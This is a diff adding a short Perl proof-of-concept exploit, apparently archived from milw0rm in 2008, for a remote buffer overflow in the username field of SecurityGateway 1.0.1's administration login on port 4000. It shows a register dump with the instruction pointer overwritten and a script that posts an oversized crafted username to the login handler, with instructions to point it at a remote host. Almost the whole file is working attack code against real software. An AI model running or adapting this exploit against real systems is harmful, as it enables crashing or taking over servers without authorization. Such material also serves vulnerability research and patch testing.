@@ -1,0 +1,28 @@
+##################################################################################################################
+# SecurityGateway 1.0.1 Remote Buffer Overflow ( username)
+# Vendor: http://www.altn.com/
+# risk : critical
+#SecurityGateway open port 4000 for remote administration/managment, EIP get owned  when the username field is filled with 720 chars
+#
+#eax=00000000 ebx=00000000 ecx=63636363 edx=7c9137d8 esi=00000000 edi=00000000
+#eip=63636363 esp=042ce910 ebp=042ce930 iopl=0         nv up ei pl zr na pe nc
+#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+#63636363 ??              ???
+#
+# Replace http://127.0.0.1:4000/ with your remote host.
+
+use LWP::UserAgent;
+$connect = LWP::UserAgent->new;
+my $payload1 ="a" x 236;
+my $payload2 ="b" x 480;
+my $eip_owned = "c" x 4;
+
+print "SecurityGateway Remote BoF exploit by securfrog.\n\n";
+my $req = HTTP::Request->new(POST => 'http://127.0.0.1:4000/SecurityGateway.dll');
+$req->content_type('application/x-www-form-urlencoded');
+$req->content('RequestedPage=login&username='.$payload2.$eip_owned.$payload1.'&passwd=world&lang=en&logon=Sign+In');
+my $res = $connect->request($req);
+print $res->as_string;
+print "Exploit successfull\n";
+
+# milw0rm.com [2008-06-01]
